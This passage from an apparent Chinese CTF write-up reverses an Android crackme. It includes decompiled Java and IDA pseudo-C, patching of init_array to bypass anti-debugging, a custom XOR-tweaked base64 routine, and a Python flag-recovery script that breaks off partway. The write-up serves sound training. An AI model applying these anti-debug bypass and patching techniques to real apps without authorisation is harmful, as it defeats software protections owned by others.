class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg6)</span> </span>&#123;</span><br><span class="line">                String inputFlag = mEditText.getText().toString();</span><br><span class="line">                <span class="keyword">if</span>(inputFlag.length() != <span class="number">42</span>) &#123;</span><br><span class="line">                    Toast.makeText(Main2Activity.<span class="keyword">this</span>, <span class="string">&quot;Wrong！！！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>((inputFlag.substring(<span class="number">0</span>, <span class="number">5</span>).equals(<span class="string">&quot;flag&#123;&quot;</span>)) &amp;&amp; (inputFlag.substring(<span class="number">41</span>).equals(<span class="string">&quot;&#125;&quot;</span>))) &#123;</span><br><span class="line">                    String flagStr = inputFlag.substring(<span class="number">5</span>, <span class="number">41</span>);</span><br><span class="line">                    <span class="keyword">if</span>((flagStr.substring(<span class="number">0</span>, <span class="number">3</span>).equals(<span class="string">&quot;e25&quot;</span>)) &amp;&amp; (Main2Activity.<span class="keyword">this</span>.md5(flagStr.substring(<span class="number">3</span>, <span class="number">8</span>)).equals(<span class="string">&quot;1E862D87DB3293B81C7D2934577A22FA&quot;</span>))) &#123;</span><br><span class="line">                        Toast.makeText(Main2Activity.<span class="keyword">this</span>, Main2Activity.<span class="keyword">this</span>.Check(flagStr.substring(<span class="number">8</span>)), <span class="number">0</span>).show();</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(Main2Activity.<span class="keyword">this</span>, <span class="string">&quot;wrong~~&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>IDA分析so文件，本着一直以来的习惯先检查<code>init_array</code>和<code>JNI_onload</code>。<br><code>init_array</code>有三个函数，其中一个使用了<code>pthread_create_key</code>，看起来好像没有反调试代码，但是真要IDA动态调试会退出，所以把它们patch过掉。</p><p>事实上目前笔者对于如何优雅地patch init_array还是不大了解。<br>之前尝试过直接修改init_array中元素值为0x0000，但是后面打包安装会出错；也尝试过在函数内部插入POP指令直接返回，但是没有处理好堆栈还是出问题了；这里是把init_array中的值修改为一个无关函数的起始地址来patch掉检测代码的。</p><p>过掉反检测代码，检查JNI_onload中的动态注册操作，比较简单，就是把sub_8ED24CF8()函数注册为check()函数。<br>在sub_8ED24CF8中，ooo000()函数先把传进来的flag做一遍base64编码，然后check()函数把编码后的数组进行抑或并与目标数组比较。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_8ED24CF8</span><span class="params">(JNIEnv *env, <span class="keyword">int</span> jthiz, <span class="keyword">int</span> inputFlag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v6; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *flag_base64; <span class="comment">// [sp+0h] [bp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">8</span>]; <span class="comment">// [sp+4h] [bp-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = (*env)-&gt;GetStringUTFChars(env, inputFlag, <span class="number">0</span>);</span><br><span class="line">  ooo000(&amp;flag_base64, v4);<span class="comment">// 换表base64编码</span></span><br><span class="line">  v5 = check(flag_base64);<span class="comment">// 抑或校验</span></span><br><span class="line">  v6 = <span class="string">&quot;tql!!!!&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">    v6 = <span class="string">&quot;啊这。。&quot;</span>;</span><br><span class="line">  v7 = ((*env)-&gt;NewStringUTF)(env, v6, <span class="string">&quot;啊这。。&quot;</span>);</span><br><span class="line">  sub_8ED27710(flag_base64 - <span class="number">12</span>, v10);</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看ooo000()函数，代码中出现了相当明显的base64算法，更换了base64映射表。<br>注意<code>appendString(retString, base64table[*(int6_4 + ind) ^ (*(int6_4 + ind) &gt;&gt; 3)]);</code>这段代码。<br>常规的base64，把3个byte转换为4个int6之后，直接把base64table[int6]追加到密文字符串之后就行了。<br>这里加了一点处理，追加的是base64table[ int6 ^ (int6&gt;&gt;3) ]。<br>好在这个过程是可逆的，反过来是:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index = base64table.index(base64cipher[i])</span><br><span class="line">int6 = (index  &amp; <span class="number">0x38</span>) | ((index&gt;&gt;<span class="number">3</span>) ^ (index&amp;<span class="number">0x7</span>))</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">ooo000</span><span class="params">(<span class="keyword">char</span> *retString, <span class="keyword">const</span> <span class="keyword">char</span> *flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">size_t</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">int</span> ind; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v8; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v10; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v17; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> int6_4[<span class="number">10</span>]; <span class="comment">// [sp+8h] [bp-28h]</span></span><br><span class="line"></span><br><span class="line">  int6_4[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v4 = sub_8ED28214(retString, &amp;unk_8ED370CE);</span><br><span class="line">  sub_8ED24488(v4);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ind = <span class="number">0</span>;</span><br><span class="line">      v8 = flag[<span class="number">3</span> * v6];</span><br><span class="line">      v9 = &amp;flag[<span class="number">3</span> * v6];</span><br><span class="line">      LOBYTE(int6_4[<span class="number">0</span>]) = v8 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      v10 = v9[<span class="number">1</span>];</span><br><span class="line">      BYTE1(int6_4[<span class="number">0</span>]) = (<span class="number">16</span> * v8) &amp; <span class="number">0x30</span> | (v10 &gt;&gt; <span class="number">4</span>);</span><br><span class="line">      v11 = *(v9 + <span class="number">2</span>);</span><br><span class="line">      BYTE2(int6_4[<span class="number">0</span>]) = (v11 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0xC3</span> | (<span class="number">4</span> * (v10 &amp; <span class="number">0xF</span>));</span><br><span class="line">      HIBYTE(int6_4[<span class="number">0</span>]) = v11 &amp; <span class="number">0x3F</span>;<span class="comment">// 相当明显的base64操作</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        appendString(retString, base64table[*(int6_4 + ind) ^ (*(int6_4 + ind) &gt;&gt; <span class="number">3</span>)]);</span><br><span class="line">        ++ind;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( ind &lt; <span class="number">4</span> );</span><br><span class="line">      v5 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">      ++v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v6 &lt; v5 / <span class="number">3</span> );</span><br><span class="line">    v12 = <span class="number">3</span> * v6;</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = v5 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 % <span class="number">3</span> )                                 <span class="comment">// 这里在补上==或=</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = flag[v12];</span><br><span class="line">    v15 = (<span class="number">16</span> * v14) &amp; <span class="number">0x30</span>;</span><br><span class="line">    LOBYTE(int6_4[<span class="number">0</span>]) = flag[v12] &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    v16 = v15 | (flag[v12 + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    BYTE1(int6_4[<span class="number">0</span>]) = v15 | (flag[v12 + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    appendString(retString, base64table[(v14 &gt;&gt; <span class="number">5</span>) ^ (v14 &gt;&gt; <span class="number">2</span>)]);</span><br><span class="line">    appendString(retString, base64table[v16 ^ (v16 &gt;&gt; <span class="number">3</span>)]);</span><br><span class="line">    <span class="keyword">if</span> ( (v13 &amp; <span class="number">3</span>) == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = (<span class="number">4</span> * flag[v12 + <span class="number">1</span>]) &amp; <span class="number">0x3C</span>;</span><br><span class="line">      v18 = v17 | (flag[v12 + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>);</span><br><span class="line">      BYTE2(int6_4[<span class="number">0</span>]) = v17 | (flag[v12 + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>);</span><br><span class="line">      appendString(retString, base64table[v18 ^ (v17 &gt;&gt; <span class="number">3</span>)]);</span><br><span class="line">      sub_8ED26168(retString, <span class="string">&quot;=&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (v13 &amp; <span class="number">3</span>) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_8ED26168(retString, <span class="string">&quot;==&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _stack_chk_guard - int6_4[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是得到一个<code>base64bytes</code>数组，在check函数中对它进行校验。<br>看起来这里的校验逻辑非常复杂，但是不需要一一厘清，只需要关注有意义的那两行代码就好。<br>根据经验加一点点合理的推测，就是先使用xor_key数组把刚刚得到的base64bytes数组抑或成bytesAfterXor数组，然后和aimBytes比较是否一致。<br>aimBytes数组的可以直接提取，xor_key存在于bss段，需要确定生成逻辑。但是因为我是动态调试的，所以直接从内存里面dump出来的。<br>有了这两个数据的具体值，可以还原base64bytes，再根据base64算法，可以还原出flag。<br>代码在最后。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">check</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *base64bytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">int</span> lens; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// lr</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [sp+4h] [bp-D4h]</span></span><br><span class="line">  <span class="keyword">int</span> ind; <span class="comment">// [sp+Ch] [bp-CCh]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [sp+10h] [bp-C8h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [sp+14h] [bp-C4h]</span></span><br><span class="line">  <span class="keyword">int</span> aimBytes[<span class="number">40</span>]; <span class="comment">// [sp+18h] [bp-C0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(aimBytes, off_8ED37180, <span class="keyword">sizeof</span>(aimBytes));</span><br><span class="line">  lens = <span class="built_in">strlen</span>(base64bytes);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; i = v15 + <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">517013752</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v5 == <span class="number">517013752</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = i;</span><br><span class="line">      v5 = <span class="number">-1119517027</span>;</span><br><span class="line">      <span class="keyword">if</span> ( i &lt; <span class="number">256</span> )</span><br><span class="line">        v5 = <span class="number">1985024802</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">-1119517027</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    dword_8ED3B0E8[v15] = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_8ED24684();</span><br><span class="line">  v6 = sub_8ED24978();</span><br><span class="line">  v7 = sub_8ED24A18(v6, lens);</span><br><span class="line">  v8 = <span class="number">2031990082</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v12 = v7;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( v8 &lt;= <span class="number">-44937610</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v8 &gt; <span class="number">-1227108057</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">-1227108056</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v10 = <span class="number">1</span>;</span><br><span class="line">LABEL_27:</span><br><span class="line">              v12 = v10;</span><br><span class="line">              v8 = <span class="number">1736361794</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v8 = <span class="number">1517945422</span>;</span><br><span class="line">              <span class="keyword">if</span> ( bytesAfterXor[v14] != aimBytes[v14] )</span><br><span class="line">                v8 = <span class="number">1454719996</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( v8 == <span class="number">-1972997478</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v14 = v1;</span><br><span class="line">            v8 = <span class="number">-1227108056</span>;</span><br><span class="line">            <span class="keyword">if</span> ( v1 &lt; <span class="number">40</span> )</span><br><span class="line">              v8 = <span class="number">-96183791</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v8 = <span class="number">0x791DB542</span>;</span><br><span class="line">            bytesAfterXor[ind] = xor_key[<span class="number">4</span> * ind] ^ base64bytes[ind] ^ ind;</span><br><span class="line">            v9 = ind + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v8 &gt; <span class="number">1517945421</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v8 != <span class="number">-44937609</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">        &#125;</span><br><span class="line">        v1 = <span class="number">0</span>;</span><br><span class="line">        v8 = <span class="number">-1972997478</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 != <span class="number">1517945422</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v8 = <span class="number">-1972997478</span>;</span><br><span class="line">      v1 = v14 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v8 != <span class="number">2031990082</span> )</span><br><span class="line">      <span class="keyword">return</span> v12;</span><br><span class="line">    ind = v9;</span><br><span class="line">    v8 = <span class="number">-44937609</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v9 &lt; <span class="number">40</span> )</span><br><span class="line">      v8 = <span class="number">-1516589019</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flag还原代码</span></span><br><span class="line">base64Bytes = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line"></span><br><span class="line">base64table=[<span class="number">0x5A</span>, <span class="number">0x4F</span>, <span class="number">0x36</span>, <span class="number">0x4B</span>, <span class="number">0x71</span>, <span class="number">0x37</span>, <span class="number">0x39</span>, <span class="number">0x4C</span>, <span class="number">0x26</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x50</span>, <span class="number">0x57</span>, <span class="number">0x76</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0x70</span>, <span class="number">0x7A</span>, <span class="number">0x51</span>, </span><br><span class="line"><span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x44</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x64</span>,</span><br><span class="line"><span class="number">0x69</span>, <span class="number">0x2A</span>, <span class="number">0x6B</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x38</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x46</span>,</span><br><span class="line"><span class="number">0x65</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x2B</span>, <span class="number">0x2F</span>, <span class="number">0x75</span>, <span class="number">0x35</span>,</span><br><span class="line"><span class="number">0x61</span>, <span class="number">0x5E</span>, <span class="number">0x32</span>, <span class="number">0x59</span>, <span class="number">0x74</span>, <span class="number">0x54</span>, <span class="number">0x4A</span>, <span class="number">0x55</span>, <span class="number">0x56</span>,</span><br><span class="line"><span class="number">0x45</span>, <span class="number">0x6E</span>, <span class="number">0x30</span>, <span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x79</span>, <span class="number">0x23</span>]</span><br><span class="line"></span><br><span class="line">key= [<span class="number">0xF8</span>, <span class="number">0xA7</span>, <span class="number">0x9E</span>, <span class="number">0xA0</span>, <span class="number">0xC3</span>,</span><br><span class="line"><span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x21</span>, <span class="number">0xD5</span>, <span class="number">0xE0</span>,</span><br><span class="line"><span class="number">0x40</span>, <span class="number">0xA5</span>, <span class="number">0x80</span>, <span class="number">0x87</span>, </span><br><span class="line"><span class="number">0x9B</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0x30</span>, <span class="number">0xBB</span>, </span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0x80</span>, <span class="number">0x21</span>, <span class="number">0xD1</span>, <span class="number">0xD0</span>,</span><br><span class="line"><span class="number">0xE5</span>, <span class="number">0x7F</span>, <span class="number">0xB2</span>, <span class="number">0xE1</span>, </span><br><span class="line"><span class="number">0xE9</span>, <span class="number">0xC4</span>, <span class="number">0x73</span>, <span class="number">0x96</span>, <span class="number">0x90</span>,</span><br><span class="line"><span class="number">0x82</span>, <span class="number">0x21</span>, <span class="number">0x11</span>, <span class="number">0x47</span>, <span class="number">0xD2</span>,</span><br><span class="line"><span class="number">0xC8</span>, <span class="number">0x44</span>]</span><br><span class="line"></span><br><span class="line">aimBytes=[<span class="number">0xA8</span>, <span class="number">0xCE</span>, <span class="number">0xCE</span>, <span class="number">0xD7</span>, <span class="number">0xB1</span>, <span class="number">0x5A</span>, <span class="number">0x20</span>, <span class="number">0x4B</span>, <span class="number">0xAB</span>, <span class="number">0xA2</span>, <span class="number">0x23</span>, <span class="number">0xFA</span>,</span><br><span class="line"><span class="number">0xFC</span>, <span class="number">0xF0</span>, <span class="number">0xDF</span>, <span class="number">0xA5</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xE6</span>, <span class="number">0x41</span>, <span class="number">0xC4</span>, <span class="number">0x65</span>, <span class="number">0x84</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x0A</span>, <span class="number">0xE6</span>, <span class="number">0xAE</span>, <span class="number">0xBB</span>, <span class="number">0xB5</span>, <span class="number">0x37</span>, <span class="number">0xFD</span>, <span class="number">0xC0</span>, <span class="number">0xCB</span>, <span class="number">0x72</span>, <span class="number">0x78</span>,</span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x91</span>, <span class="number">0xD3</span>, <span class="number">0x5E</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printHexInList</span>(<span class="params">l</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bin</span>(i)[<span class="number">2</span>:], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    base64Bytes[ind] = aimBytes[ind] ^ key[ind] ^ ind</span><br><span class="line">    <span class="comment"># print(bin(base64Bytes[ind]),end=&#x27;, &#x27;)</span></span><br><span class="line"><span class="comment"># print()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess3Bytes</span>(<span class="params">int6_4byte</span>):</span></span><br><span class="line">    o_int6_4bytes=[<span class="number">0</span>,<span 